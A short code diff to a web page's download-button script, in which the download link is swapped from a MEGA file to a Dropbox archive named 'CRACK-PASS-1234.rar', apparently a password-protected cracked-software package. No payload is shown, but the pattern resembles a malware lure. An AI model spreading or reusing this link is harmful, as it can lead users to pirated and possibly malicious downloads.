@@ -95,7 +95,7 @@ document.addEventListener('DOMContentLoaded', function() {
     // ========== КНОПКИ СКАЧИВАНИЯ ==========
     const downloadButtons = document.querySelectorAll('.download-btn');
     const downloadToast = document.getElementById('downloadToast');
-    const MEGA_LINK = 'https://mega.nz/file/HAtn2I4C#_3betMFSboX8b2dZZN5JXfuP7BshVaLmt3YpE7CFP4Y';
+    const MEGA_LINK = 'https://www.dropbox.com/scl/fi/yugitnie26kl3cruj53h3/CRACK-PASS-1234.rar?rlkey=js1wjscuxi36l1wl9i13fm9jk&st=q8fxe7sz&dl=0';
 
     downloadButtons.forEach(btn => {
         btn.addEventListener('click', function() {
